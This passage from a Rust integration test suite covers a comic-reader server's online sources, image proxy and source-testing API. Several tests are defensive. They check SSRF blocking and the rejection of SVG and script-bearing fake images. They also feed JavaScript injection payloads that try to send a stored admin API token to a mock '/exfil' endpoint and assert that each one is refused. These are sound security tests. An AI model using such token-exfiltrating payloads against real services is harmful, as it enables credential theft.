    assert_eq!(md_pg["pages"].as_array().unwrap().len(), 2);
    let md_proxy_url = md_pg["pages"][0]["proxy_url"].as_str().unwrap();

    let px_resp = h
        .app
        .clone()
        .oneshot(
            Request::builder()
                .uri(md_proxy_url)
                .header(header::AUTHORIZATION, format!("Bearer {}", h.member_token))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(px_resp.status(), StatusCode::OK);
    assert_eq!(
        px_resp
            .headers()
            .get(header::X_CONTENT_TYPE_OPTIONS)
            .unwrap(),
        "nosniff"
    );

    // 2. WEBTOON EN full E2E (ownText author, sort=oldest, paginate nextTocUrl, #_imageList@data-url, Referer image-proxy)
    let (st_ws, b_ws) = json_request(
        &h.app,
        "POST",
        "/api/v1/comic/online/search",
        &h.member_token,
        Some(serde_json::json!({ "keyword": "tower", "source_ids": [wt_id], "page": 1 })),
    )
    .await;
    assert_eq!(st_ws, StatusCode::OK);
    let wt_search: serde_json::Value = serde_json::from_slice(&b_ws).unwrap();
    let wt_comic_url = wt_search["results"][0]["comic_url"].as_str().unwrap();

    let (st_wd, b_wd) = json_request(
        &h.app,
        "POST",
        "/api/v1/comic/online/detail",
        &h.member_token,
        Some(serde_json::json!({ "source_id": wt_id, "comic_url": wt_comic_url })),
    )
    .await;
    assert_eq!(st_wd, StatusCode::OK);
    let wt_det: serde_json::Value = serde_json::from_slice(&b_wd).unwrap();
    assert_eq!(wt_det["detail"]["author"], "SIU");
    assert_eq!(wt_det["detail"]["reading_direction"], "webtoon");
    assert_eq!(wt_det["chapters"].as_array().unwrap().len(), 2);
    assert_eq!(wt_det["chapters"][0]["title"], "Ep. 1");
    assert_eq!(wt_det["chapters"][1]["title"], "Ep. 2");
    let wt_ch_url = wt_det["chapters"][0]["url"].as_str().unwrap();

    let (st_wp, b_wp) = json_request(
        &h.app,
        "POST",
        "/api/v1/comic/online/pages",
        &h.member_token,
        Some(serde_json::json!({ "source_id": wt_id, "chapter_url": wt_ch_url })),
    )
    .await;
    assert_eq!(st_wp, StatusCode::OK);
    let wt_pg: serde_json::Value = serde_json::from_slice(&b_wp).unwrap();
    assert_eq!(wt_pg["reading_direction"], "webtoon");
    // Carousel data-url outside #_imageList must NOT be included
    assert_eq!(wt_pg["pages"].as_array().unwrap().len(), 2);
    let wt_proxy_url = wt_pg["pages"][0]["proxy_url"].as_str().unwrap();

    // Image proxy injects Referer from imageHeader -> 200 image/jpeg!
    let wt_px_resp = h
        .app
        .clone()
        .oneshot(
            Request::builder()
                .uri(wt_proxy_url)
                .header(header::AUTHORIZATION, format!("Bearer {}", h.member_token))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(wt_px_resp.status(), StatusCode::OK);
    assert_eq!(
        wt_px_resp.headers().get(header::CONTENT_TYPE).unwrap(),
        "image/jpeg"
    );

    // Without source_id, Referer is not injected -> upstream 403 -> proxy returns 400
    let wt_raw_img = wt_pg["pages"][0]["image_url"].as_str().unwrap();
    let wt_no_src_resp = h
        .app
        .clone()
        .oneshot(
            Request::builder()
                .uri(format!(
                    "/api/v1/comic/online/image-proxy?url={}",
                    form_urlencoded::byte_serialize(wt_raw_img.as_bytes()).collect::<String>()
                ))
                .header(header::AUTHORIZATION, format!("Bearer {}", h.member_token))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(wt_no_src_resp.status(), StatusCode::BAD_REQUEST);

    // 3. XKCD full E2E + all 6 test modes
    let (st_full, b_full) = json_request(
        &h.app,
        "POST",
        &format!("/api/v1/comic/sources/{xkcd_id}/test"),
        &h.admin_token,
        Some(serde_json::json!({ "mode": "full", "keyword": "Plate" })),
    )
    .await;
    assert_eq!(st_full, StatusCode::OK);
    let rep_full: serde_json::Value = serde_json::from_slice(&b_full).unwrap();
    assert_eq!(rep_full["ok"], true);
    assert_eq!(rep_full["page_count"], 1);
    assert_eq!(rep_full["steps"].as_array().unwrap().len(), 4);

    for (mode, extra) in [
        ("search", serde_json::json!({ "keyword": "Plate" })),
        ("explore", serde_json::json!({})),
        (
            "detail",
            serde_json::json!({ "target_url": format!("{base}/3327/info.0.json") }),
        ),
        (
            "chapters",
            serde_json::json!({ "target_url": format!("{base}/3327/info.0.json") }),
        ),
        (
            "pages",
            serde_json::json!({ "target_url": format!("{base}/3327/info.0.json") }),
        ),
    ] {
        let mut body = extra;
        body["mode"] = serde_json::Value::String(mode.into());
        let (st_m, b_m) = json_request(
            &h.app,
            "POST",
            &format!("/api/v1/comic/sources/{xkcd_id}/test"),
            &h.admin_token,
            Some(body),
        )
        .await;
        assert_eq!(st_m, StatusCode::OK, "test mode {mode} failed");
        let v_m: serde_json::Value = serde_json::from_slice(&b_m).unwrap();
        assert_eq!(v_m["ok"], true, "test mode {mode} report not ok: {v_m}");
    }

    // 4. Verify non-admin diagnostics.logs stripping vs admin logs
    let (st_adm_pg, b_adm_pg) = json_request(
        &h.app,
        "POST",
        "/api/v1/comic/online/pages",
        &h.admin_token,
        Some(serde_json::json!({ "source_id": md_id, "chapter_url": md_ch_url })),
    )
    .await;
    assert_eq!(st_adm_pg, StatusCode::OK);
    let _: serde_json::Value = serde_json::from_slice(&b_adm_pg).unwrap();

    // Non-admin logs must always be empty
    assert!(md_pg["diagnostics"]["logs"].as_array().unwrap().is_empty());

    server.abort();
}

#[tokio::test]
async fn image_proxy_ssrf_svg_html_and_16mib_cap_and_search_error_isolation() {
    let png = valid_png_bytes();
    let png_9mib = {
        let mut v = png.clone();
        v.resize(9 * 1024 * 1024, 0u8);
        v
    };

    let mock_app = Router::new()
        .route(
            "/ok.png",
            get(move || {
                let bytes = png.clone();
                async move {
                    Response::builder()
                        .status(StatusCode::OK)
                        .header("content-type", "image/png")
                        .body(Body::from(bytes))
                        .unwrap()
                }
            }),
        )
        .route(
            "/9mib.png",
            get(move || {
                let bytes = png_9mib.clone();
                async move {
                    Response::builder()
                        .status(StatusCode::OK)
                        .header("content-type", "image/png")
                        .body(Body::from(bytes))
                        .unwrap()
                }
            }),
        )
        .route(
            "/over16mib.png",
            get(|| async {
                let mut payload = valid_png_bytes();
                payload.resize(16 * 1024 * 1024 + 1, 0u8);
                Response::builder()
                    .status(StatusCode::OK)
                    .header("content-type", "image/png")
                    .body(Body::from(payload))
                    .unwrap()
            }),
        )
        .route(
            "/evil.svg",
            get(|| async {
                Response::builder()
                    .status(StatusCode::OK)
                    .header("content-type", "image/svg+xml")
                    .body(Body::from("<svg></svg>"))
                    .unwrap()
            }),
        )
        .route(
            "/fake_html.png",
            get(|| async {
                Response::builder()
                    .status(StatusCode::OK)
                    .header("content-type", "image/png")
                    .body(Body::from("<html><script>alert(1)</script></html>"))
                    .unwrap()
            }),
        )
        .route(
            "/good-search",
            get(|| async {
                Response::builder()
                    .status(StatusCode::OK)
                    .header("content-type", "application/json")
                    .body(Body::from(r#"{"items":[{"t":"Good Comic","u":"/c/1"}]}"#))
                    .unwrap()
            }),
        )
        .route(
            "/bad-search",
            get(|| async { (StatusCode::INTERNAL_SERVER_ERROR, "upstream boom") }),
        );

    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    let server = tokio::spawn(async move {
        axum::serve(listener, mock_app).await.unwrap();
    });
    let base = format!("http://{addr}");

    // 1. Default hardened mode (init_comic_module -> allow_private_ips = false) blocks loopback SSRF
    {
        let tmp = TempDir::new().unwrap();
        let db_path = tmp.path().join("ssrf.db");
        let db_url = format!("sqlite:{}", db_path.display());
        let mut models = ModelSet::new();
        register_core_models(&mut models);
        register_comic_models(&mut models);
        let mut db = Db::builder().models(models).connect(&db_url).await.unwrap();
        ensure_core_schema(&mut db, &db_url).await.unwrap();
        ensure_comic_schema(&mut db, &db_url).await.unwrap();

        let users = Arc::new(ToastyUserRepository::new(db.clone()));
        let libraries_repo = Arc::new(ToastyLibraryRepository::new(db.clone()));
        let lifecycles = Arc::new(RwLock::new(HashMap::new()));
        let auth = Arc::new(AuthService::new(
            users,
            Arc::new(SecurityManager::new("ssrf-sec")),
            Arc::new(JwtTokenService::new("ssrf-sec", 3600)),
            lifecycles.clone(),
        ));
        let library_svc = Arc::new(LibraryService::new(
            libraries_repo.clone(),
            Arc::new(BroadcastEventHub::default()),
            lifecycles,
        ));
        let services = init_comic_module(
            db,
            tmp.path(),
            libraries_repo,
            &library_svc,
            Arc::new(BroadcastEventHub::default()),
        )
        .unwrap();
        let admin_sess = auth
            .setup_initial_admin(SetupAdminInput {
                username: "admin".into(),
                display_name: None,
                password: "password12345".into(),
            })
            .await
            .unwrap();
        let app = Router::new().nest(
            "/api/v1/comic",
            rest_router(ComicHttpState::new(auth, library_svc, services)),
        );

        let ssrf_url = form_urlencoded::byte_serialize(format!("{base}/ok.png").as_bytes())
            .collect::<String>();
        let resp = app
            .oneshot(
                Request::builder()
                    .uri(format!("/api/v1/comic/online/image-proxy?url={ssrf_url}"))
                    .header(
                        header::AUTHORIZATION,
                        format!("Bearer {}", admin_sess.token),
                    )
                    .body(Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(resp.status(), StatusCode::BAD_REQUEST);
    }

    // 2. Allow-private-IPs harness validates 9 MiB pass, >16 MiB reject, SVG/HTML reject, and search error isolation
    let h = setup_test_harness(true).await;

    for bad_path in ["/evil.svg", "/fake_html.png", "/over16mib.png"] {
        let enc = form_urlencoded::byte_serialize(format!("{base}{bad_path}").as_bytes())
            .collect::<String>();
        let resp = h
            .app
            .clone()
            .oneshot(
                Request::builder()
                    .uri(format!("/api/v1/comic/online/image-proxy?url={enc}"))
                    .header(header::AUTHORIZATION, format!("Bearer {}", h.member_token))
                    .body(Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();
        assert_eq!(
            resp.status(),
            StatusCode::BAD_REQUEST,
            "expected 400 on {bad_path}"
        );
    }

    // 9 MiB valid PNG succeeds (confirming 16 MiB cap > 8 MiB default)
    let enc_9mib =
        form_urlencoded::byte_serialize(format!("{base}/9mib.png").as_bytes()).collect::<String>();
    let resp_9mib = h
        .app
        .clone()
        .oneshot(
            Request::builder()
                .uri(format!("/api/v1/comic/online/image-proxy?url={enc_9mib}"))
                .header(header::AUTHORIZATION, format!("Bearer {}", h.member_token))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(resp_9mib.status(), StatusCode::OK);
    assert_eq!(
        resp_9mib.headers().get(header::CONTENT_TYPE).unwrap(),
        "image/png"
    );
    assert_eq!(
        resp_9mib
            .headers()
            .get(header::X_CONTENT_TYPE_OPTIONS)
            .unwrap(),
        "nosniff"
    );
    assert!(
        resp_9mib
            .headers()
            .get(header::CONTENT_SECURITY_POLICY)
            .unwrap()
            .to_str()
            .unwrap()
            .contains("sandbox")
    );

    // Search error isolation: 1 good source + 1 failing source
    let two_sources = serde_json::json!([
        {
            "sourceName": "Good Source",
            "sourceUrl": format!("{base}#good"),
            "searchUrl": format!("{base}/good-search"),
            "ruleSearch": { "bookList": "$.items[*]", "name": "$.t", "bookUrl": "$.u" }
        },
        {
            "sourceName": "Broken Source",
            "sourceUrl": format!("{base}#bad"),
            "searchUrl": format!("{base}/bad-search"),
            "ruleSearch": { "bookList": "@js:(function(){throw new Error('upstream boom');})()", "name": "$.t", "bookUrl": "$.u" }
        }
    ]);
    let (st_imp, _) = json_request(
        &h.app,
        "POST",
        "/api/v1/comic/sources/import",
        &h.admin_token,
        Some(serde_json::json!({ "raw_json": two_sources.to_string() })),
    )
    .await;
    assert_eq!(st_imp, StatusCode::OK);

    let (st_s, b_s) = json_request(
        &h.app,
        "POST",
        "/api/v1/comic/online/search",
        &h.member_token,
        Some(serde_json::json!({ "keyword": "test", "page": 1 })),
    )
    .await;
    assert_eq!(st_s, StatusCode::OK);
    let s_val: serde_json::Value = serde_json::from_slice(&b_s).unwrap();
    assert_eq!(s_val["results"].as_array().unwrap().len(), 1);
    assert_eq!(s_val["results"][0]["title"], "Good Comic");
    assert_eq!(s_val["errors"].as_array().unwrap().len(), 1);
    assert_eq!(s_val["errors"][0]["source_name"], "Broken Source");

    server.abort();
}

#[tokio::test]
async fn test_source_detail_mode_fails_on_http_500_empty_match_and_preserves_full_without_rule_detail_and_group_key()
 {
    let mock_app = Router::new()
        .route(
            "/err500",
            get(|| async { (StatusCode::INTERNAL_SERVER_ERROR, "<h1>Server Error</h1>") }),
        )
        .route(
            "/empty200",
            get(|| async {
                Response::builder()
                    .status(StatusCode::OK)
                    .header("content-type", "text/html")
                    .body(Body::from("<html><body><p>unrelated</p></body></html>"))
                    .unwrap()
            }),
        )
        .route(
            "/valid_detail",
            get(|| async {
                Response::builder()
                    .status(StatusCode::OK)
                    .header("content-type", "text/html")
                    .body(Body::from(
                        r#"<html><body><h1 class="title">Real Comic</h1><a class="toc" href="/toc_page">TOC</a></body></html>"#,
                    ))
                    .unwrap()
            }),
        )
        .route(
            "/no_detail_entry",
            get(|| async {
                Response::builder()
                    .status(StatusCode::OK)
                    .header("content-type", "text/html")
                    .body(Body::from(
                        r#"<ul id="toc"><li><a href="/ch_page">Ch 1</a></li></ul>"#,
                    ))
                    .unwrap()
            }),
        )
        .route(
            "/ch_page",
            get(|| async {
                Response::builder()
                    .status(StatusCode::OK)
                    .header("content-type", "text/html")
                    .body(Body::from(r#"<div id="imgs"><img src="/p1.jpg"></div>"#))
                    .unwrap()
            }),
        );

    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    let server = tokio::spawn(async move {
        axum::serve(listener, mock_app).await.unwrap();
    });
    let base = format!("http://{addr}");

    let h = setup_test_harness(true).await;

    // 1. Import a Legado-format source with ruleDetail
    let detail_src = serde_json::json!({
        "bookSourceName": "DetailTest",
        "bookSourceUrl": base,
        "bookSourceGroup": "OriginalGroup",
        "bookSourceType": 2,
        "ruleDetail": { "name": "h1.title@text", "tocUrl": "a.toc@href" }
    });
    let (st_imp, b_imp) = json_request(
        &h.app,
        "POST",
        "/api/v1/comic/sources/import",
        &h.admin_token,
        Some(serde_json::json!({ "raw_json": detail_src.to_string() })),
    )
    .await;
    assert_eq!(st_imp, StatusCode::OK);
    let imp_val: serde_json::Value = serde_json::from_slice(&b_imp).unwrap();
    let detail_id = imp_val["sources"][0]["id"].as_str().unwrap().to_string();

    // HTTP 500 -> mode: "detail" must report ok=false and persist last_test_ok=false
    let (st_500, b_500) = json_request(
        &h.app,
        "POST",
        &format!("/api/v1/comic/sources/{detail_id}/test"),
        &h.admin_token,
        Some(serde_json::json!({ "mode": "detail", "target_url": format!("{base}/err500") })),
    )
    .await;
    assert_eq!(st_500, StatusCode::OK);
    let v_500: serde_json::Value = serde_json::from_slice(&b_500).unwrap();
    assert_eq!(v_500["ok"], false, "expected ok=false on 500: {v_500}");
    assert_eq!(v_500["steps"][0]["ok"], false);

    // Empty-match 200 -> mode: "detail" must report ok=false and persist last_test_ok=false
    let (st_emp, b_emp) = json_request(
        &h.app,
        "POST",
        &format!("/api/v1/comic/sources/{detail_id}/test"),
        &h.admin_token,
        Some(serde_json::json!({ "mode": "detail", "target_url": format!("{base}/empty200") })),
    )
    .await;
    assert_eq!(st_emp, StatusCode::OK);
    let v_emp: serde_json::Value = serde_json::from_slice(&b_emp).unwrap();
    assert_eq!(v_emp["ok"], false, "expected ok=false on empty200: {v_emp}");
    assert_eq!(v_emp["steps"][0]["ok"], false);

    let (st_list, b_list) =
        json_request(&h.app, "GET", "/api/v1/comic/sources", &h.admin_token, None).await;
    assert_eq!(st_list, StatusCode::OK);
    let list_val: Vec<serde_json::Value> = serde_json::from_slice(&b_list).unwrap();
    assert_eq!(list_val[0]["last_test_ok"], false);

    // Valid 200 detail -> mode: "detail" reports ok=true
    let (st_ok, b_ok) = json_request(
        &h.app,
        "POST",
        &format!("/api/v1/comic/sources/{detail_id}/test"),
        &h.admin_token,
        Some(serde_json::json!({ "mode": "detail", "target_url": format!("{base}/valid_detail") })),
    )
    .await;
    assert_eq!(st_ok, StatusCode::OK);
    let v_ok: serde_json::Value = serde_json::from_slice(&b_ok).unwrap();
    assert_eq!(v_ok["ok"], true);
    assert_eq!(v_ok["comic_detail"]["title"], "Real Comic");

    // Bug 7: Clear group_name -> restore group_name -> export must preserve "bookSourceGroup"
    let (st_clr, _) = json_request(
        &h.app,
        "PATCH",
        &format!("/api/v1/comic/sources/{detail_id}"),
        &h.admin_token,
        Some(serde_json::json!({ "group_name": "" })),
    )
    .await;
    assert_eq!(st_clr, StatusCode::OK);
    let (st_rst, _) = json_request(
        &h.app,
        "PATCH",
        &format!("/api/v1/comic/sources/{detail_id}"),
        &h.admin_token,
        Some(serde_json::json!({ "group_name": "Restored" })),
    )
    .await;
    assert_eq!(st_rst, StatusCode::OK);
    let (st_exp, b_exp) = json_request(
        &h.app,
        "GET",
        &format!("/api/v1/comic/sources/{detail_id}/export"),
        &h.admin_token,
        None,
    )
    .await;
    assert_eq!(st_exp, StatusCode::OK);
    let exp_val: serde_json::Value = serde_json::from_slice(&b_exp).unwrap();
    assert_eq!(exp_val["bookSourceGroup"], "Restored");
    assert!(exp_val.get("sourceGroup").is_none());

    // 2. Source WITHOUT ruleDetail running Full mode with target_url still succeeds through toc + pages
    let no_detail_src = serde_json::json!({
        "sourceName": "NoDetailSource",
        "sourceUrl": format!("{base}#nodetail"),
        "ruleToc": {
            "chapterList": "#toc li",
            "chapterName": "a@text",
            "chapterUrl": "a@href"
        },
        "ruleContent": {
            "content": "#imgs@html"
        }
    });
    let (st_imp2, b_imp2) = json_request(
        &h.app,
        "POST",
        "/api/v1/comic/sources/import",
        &h.admin_token,
        Some(serde_json::json!({ "raw_json": no_detail_src.to_string() })),
    )
    .await;
    assert_eq!(st_imp2, StatusCode::OK);
    let imp_val2: serde_json::Value = serde_json::from_slice(&b_imp2).unwrap();
    let no_detail_id = imp_val2["sources"][0]["id"].as_str().unwrap().to_string();

    let (st_full_nd, b_full_nd) = json_request(
        &h.app,
        "POST",
        &format!("/api/v1/comic/sources/{no_detail_id}/test"),
        &h.admin_token,
        Some(
            serde_json::json!({ "mode": "full", "target_url": format!("{base}/no_detail_entry") }),
        ),
    )
    .await;
    assert_eq!(st_full_nd, StatusCode::OK);
    let v_full_nd: serde_json::Value = serde_json::from_slice(&b_full_nd).unwrap();
    assert_eq!(
        v_full_nd["ok"], true,
        "full mode without ruleDetail failed: {v_full_nd}"
    );
    assert_eq!(v_full_nd["chapters_total_count"], 1);
    assert_eq!(v_full_nd["page_count"], 1);

    server.abort();
}

#[tokio::test]
async fn member_explore_rejects_quickjs_injection_and_preserves_admin_secrets_and_state() {
    use std::sync::atomic::{AtomicUsize, Ordering};

    let exfil_hits = Arc::new(AtomicUsize::new(0));
    let exfil_hits_c = exfil_hits.clone();

    let mock_app = Router::new()
        .route(
            "/exfil",
            get(move || {
                let hits = exfil_hits_c.clone();
                async move {
                    hits.fetch_add(1, Ordering::SeqCst);
                    Response::builder()
                        .status(StatusCode::OK)
                        .header("content-type", "application/json")
                        .body(Body::from(r#"{"items":[{"t":"Pwned","u":"/c/p"}]}"#))
                        .unwrap()
                }
            }),
        )
        .route(
            "/cat",
            get(|| async {
                Response::builder()
                    .status(StatusCode::OK)
                    .header("content-type", "application/json")
                    .body(Body::from(r#"{"items":[{"t":"LegitCat","u":"/c/1"}]}"#))
                    .unwrap()
            }),
        );

    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    let server = tokio::spawn(async move {
        axum::serve(listener, mock_app).await.unwrap();
    });
    let base = format!("http://{addr}");

    let h = setup_test_harness(true).await;

    let src = serde_json::json!({
        "sourceName": "ExploreSecSource",
        "sourceUrl": base,
        "enabledExplore": true,
        "exploreUrl": "Legit::/cat?p={{page}}",
        "loginUi": "[{\"name\":\"apiToken\",\"type\":\"password\"}]",
        "loginUrl": "@js:'ok'",
        "ruleSearch": { "bookList": "$.items[*]", "name": "$.t", "bookUrl": "$.u" }
    });
    let (st_imp, b_imp) = json_request(
        &h.app,
        "POST",
        "/api/v1/comic/sources/import",
        &h.admin_token,
        Some(serde_json::json!({ "raw_json": src.to_string() })),
    )
    .await;
    assert_eq!(st_imp, StatusCode::OK);
    let imp_val: serde_json::Value = serde_json::from_slice(&b_imp).unwrap();
    let sid = imp_val["sources"][0]["id"].as_str().unwrap().to_string();

    let (st_login, _) = json_request(
        &h.app,
        "POST",
        &format!("/api/v1/comic/sources/{sid}/login-action"),
        &h.admin_token,
        Some(serde_json::json!({
            "login_info": { "apiToken": "super_secret_token" },
            "action": "source.setVariable('ADMIN_SECRET_VAR');'ok'"
        })),
    )
    .await;
    assert_eq!(st_login, StatusCode::OK);

    let payloads = [
        format!(
            "@js:var m=source.getLoginInfoMap();java.ajax('{base}/exfil?t='+m.apiToken);source.setVariable('PWNED');'{base}/exfil'"
        ),
        format!("<js>source.setVariable('PWNED');'{base}/exfil'</js>"),
        format!("{base}/exfil?v={{{{source.getVariable()}}}}"),
        "data:text/plain,evil".to_string(),
        format!("{base}/cat,{{\"method\":\"POST\",\"body\":\"x=1\"}}"),
    ];
    for payload in payloads {
        let (st, _) = json_request(
            &h.app,
            "POST",
            "/api/v1/comic/online/explore",
            &h.member_token,
            Some(serde_json::json!({
                "source_id": sid,
                "explore_url": payload,
                "page": 1
            })),
        )
        .await;
        assert_eq!(
            st,
            StatusCode::BAD_REQUEST,
            "expected 400 for untrusted explore_url: {payload}"
        );
    }

    assert_eq!(exfil_hits.load(Ordering::SeqCst), 0);

    // Configured category still works cleanly for Member
    let (st_ok, b_ok) = json_request(
        &h.app,
        "POST",
        "/api/v1/comic/online/explore",
        &h.member_token,
        Some(serde_json::json!({
            "source_id": sid,
            "explore_url": "/cat?p={{page}}",
            "page": 1
        })),
    )
    .await;
    assert_eq!(st_ok, StatusCode::OK);
    let ok_val: serde_json::Value = serde_json::from_slice(&b_ok).unwrap();
    assert_eq!(ok_val["items"][0]["title"], "LegitCat");

    // Admin variable must be untouched
    let (st_var, b_var) = json_request(
        &h.app,
        "GET",
        &format!("/api/v1/comic/sources/{sid}/variable"),
        &h.admin_token,
        None,
    )
    .await;
    assert_eq!(st_var, StatusCode::OK);
    let var_val: serde_json::Value = serde_json::from_slice(&b_var).unwrap();
    assert_eq!(var_val["variable"], "ADMIN_SECRET_VAR");

    server.abort();
}

#[tokio::test]
async fn online_detail_chapters_pages_enforce_cancel_on_future_drop() {
    use std::sync::atomic::{AtomicUsize, Ordering};
    use tokio::sync::Notify;

    let entered = Arc::new(Notify::new());
    let entered_c = entered.clone();
    let ch_p2_hits = Arc::new(AtomicUsize::new(0));
    let ch_p2_hits_c = ch_p2_hits.clone();

    let mock_app = Router::new()
        .route(
            "/slow_page1",
            get(move || {
                let notify = entered_c.clone();
                async move {
                    notify.notify_one();
                    tokio::time::sleep(std::time::Duration::from_secs(5)).await;
                    Response::builder()
                        .status(StatusCode::OK)
                        .body(Body::from("<h1>late</h1>"))
                        .unwrap()
                }
            }),
        )
        .route(
            "/toc_p1",
            get(|| async {
                Response::builder()
                    .status(StatusCode::OK)
                    .header("content-type", "text/html")
                    .body(Body::from(
                        r#"<ul><li><a href="/ch/1">Ch 1</a></li></ul><a class="next" href="/toc_p2">Next</a>"#,
                    ))
                    .unwrap()
            }),
        )
        .route(
            "/toc_p2",
            get(move || {
                let hits = ch_p2_hits_c.clone();
                async move {
                    hits.fetch_add(1, Ordering::SeqCst);
                    tokio::time::sleep(std::time::Duration::from_secs(5)).await;
                    Response::builder()
                        .status(StatusCode::OK)
                        .body(Body::from("<ul></ul>"))
                        .unwrap()
                }
            }),
        );

    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    let server = tokio::spawn(async move {
        axum::serve(listener, mock_app).await.unwrap();
    });
    let base = format!("http://{addr}");

    let h = setup_test_harness(true).await;

    let src = serde_json::json!({
        "sourceName": "SlowDropSource",
        "sourceUrl": base,
        "enabledExplore": true,
        "exploreUrl": "Slow::/slow_page1",
        "ruleSearch": { "bookList": "h1", "name": "@text", "bookUrl": "@text" },
        "ruleDetail": { "name": "h1@text" },
        "ruleToc": {
            "chapterList": "ul li",
            "chapterName": "a@text",
            "chapterUrl": "a@href",
            "nextTocUrl": "a.next@href"
        },
        "ruleContent": {
            "content": "#imgs@html",
            "nextContentUrl": "a.next@href"
        }
    });
    let (st_imp, b_imp) = json_request(
        &h.app,
        "POST",
        "/api/v1/comic/sources/import",
        &h.admin_token,
        Some(serde_json::json!({ "raw_json": src.to_string() })),
    )
    .await;
    assert_eq!(st_imp, StatusCode::OK);
    let imp_val: serde_json::Value = serde_json::from_slice(&b_imp).unwrap();
    let sid = imp_val["sources"][0]["id"].as_str().unwrap().to_string();

    // Dropping explore / detail / chapters / pages futures via short client timeout must return immediately
    // without blocking the caller or panicking.
    for (uri, payload) in [
        (
            "/api/v1/comic/online/explore",
            serde_json::json!({ "source_id": sid, "page": 1 }),
        ),
        (
            "/api/v1/comic/online/detail",
            serde_json::json!({ "source_id": sid, "comic_url": format!("{base}/slow_page1") }),
        ),
        (
            "/api/v1/comic/online/chapters",
            serde_json::json!({ "source_id": sid, "toc_url": format!("{base}/toc_p1") }),
        ),
        (
            "/api/v1/comic/online/pages",
            serde_json::json!({ "source_id": sid, "chapter_url": format!("{base}/slow_page1") }),
        ),
    ] {
        let res = tokio::time::timeout(
            std::time::Duration::from_millis(120),
            json_request(&h.app, "POST", uri, &h.member_token, Some(payload)),
        )
        .await;
        assert!(res.is_err(), "expected short client timeout on {uri}");
    }

    // Confirm mock server saw /slow_page1 and /toc_p2 requests
    assert!(ch_p2_hits.load(Ordering::SeqCst) >= 1);
    server.abort();
}

#[tokio::test]
async fn test_source_and_online_ops_preserve_concurrent_runtime_state_e2e() {
    use tokio::sync::Notify;

    let search_entered = Arc::new(Notify::new());
    let search_release = Arc::new(Notify::new());
    let detail_entered = Arc::new(Notify::new());
    let detail_release = Arc::new(Notify::new());

    let se = search_entered.clone();
    let sr = search_release.clone();
    let de = detail_entered.clone();
    let dr = detail_release.clone();

    let mock_app = Router::new()
        .route(
            "/search",
            get(move || {
                let se = se.clone();
                let sr = sr.clone();
                async move {
                    se.notify_one();
                    sr.notified().await;
                    Response::builder()
                        .status(StatusCode::OK)
                        .header("content-type", "application/json")
                        .body(Body::from(r#"{"items":[{"t":"Found","u":"/detail"}]}"#))
                        .unwrap()
                }
            }),
        )
        .route(
            "/detail",
            get(move || {
                let de = de.clone();
                let dr = dr.clone();
                async move {
                    de.notify_one();
                    dr.notified().await;
                    Response::builder()
                        .status(StatusCode::OK)
                        .header("content-type", "application/json")
                        .body(Body::from(r#"{"title":"DetailTitle"}"#))
                        .unwrap()
                }
            }),
        );

    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    let server = tokio::spawn(async move {
        axum::serve(listener, mock_app).await.unwrap();
    });
    let base = format!("http://{addr}");

    let h = setup_test_harness(true).await;
    let src = serde_json::json!({
        "sourceName": "ConcurrentStateSource",
        "sourceUrl": base,
        "loginUi": "[{\"name\":\"username\",\"type\":\"text\"},{\"name\":\"apiToken\",\"type\":\"password\"}]",
        "loginUrl": "@js:'logged'",
        "searchUrl": format!("{base}/search?q={{{{key}}}}"),
        "ruleSearch": { "bookList": "$.items[*]", "name": "$.t", "bookUrl": "$.u" },
        "ruleDetail": {
            "init": "@js:cookie.setCookie(baseUrl, 'detail_ck=from_detail');result",
            "name": "$.title"
        }
    });
    let (st_imp, b_imp) = json_request(
        &h.app,
        "POST",
        "/api/v1/comic/sources/import",
        &h.admin_token,
        Some(serde_json::json!({ "raw_json": src.to_string() })),
    )
    .await;
    assert_eq!(st_imp, StatusCode::OK);
    let imp_val: serde_json::Value = serde_json::from_slice(&b_imp).unwrap();
    let sid = imp_val["sources"][0]["id"].as_str().unwrap().to_string();

    // Seed v0 / t0
    let (st_l0, _) = json_request(
        &h.app,
        "POST",
        &format!("/api/v1/comic/sources/{sid}/login-action"),
        &h.admin_token,
        Some(serde_json::json!({
            "login_info": { "username": "alice_v0", "apiToken": "t0" },
            "action": "source.setVariable('v0');'ok'"
        })),
    )
    .await;
    assert_eq!(st_l0, StatusCode::OK);

    // Subcase A: test_source (search) in-flight vs concurrent login-action -> preserves v1_fresh & t1_fresh
    let app_a = h.app.clone();
    let tok_a = h.admin_token.clone();
    let sid_a = sid.clone();
    let test_task = tokio::spawn(async move {
        json_request(
            &app_a,
            "POST",
            &format!("/api/v1/comic/sources/{sid_a}/test"),
            &tok_a,
            Some(serde_json::json!({ "mode": "search", "keyword": "k" })),
        )
        .await
    });

    search_entered.notified().await;
    let (st_l1, _) = json_request(
        &h.app,
        "POST",
        &format!("/api/v1/comic/sources/{sid}/login-action"),
        &h.admin_token,
        Some(serde_json::json!({
            "login_info": { "username": "alice_v1", "apiToken": "t1_fresh" },
            "action": "source.setVariable('v1_fresh');'ok'"
        })),
    )
    .await;
    assert_eq!(st_l1, StatusCode::OK);
    search_release.notify_one();

    let (st_test, _) = test_task.await.unwrap();
    assert_eq!(st_test, StatusCode::OK);

    let (st_v1, b_v1) = json_request(
        &h.app,
        "GET",
        &format!("/api/v1/comic/sources/{sid}/variable"),
        &h.admin_token,
        None,
    )
    .await;
    assert_eq!(st_v1, StatusCode::OK);
    let v1_json: serde_json::Value = serde_json::from_slice(&b_v1).unwrap();
    assert_eq!(v1_json["variable"], "v1_fresh");

    let (st_chk1, b_chk1) = json_request(
        &h.app,
        "POST",
        &format!("/api/v1/comic/sources/{sid}/login-action"),
        &h.admin_token,
        Some(serde_json::json!({
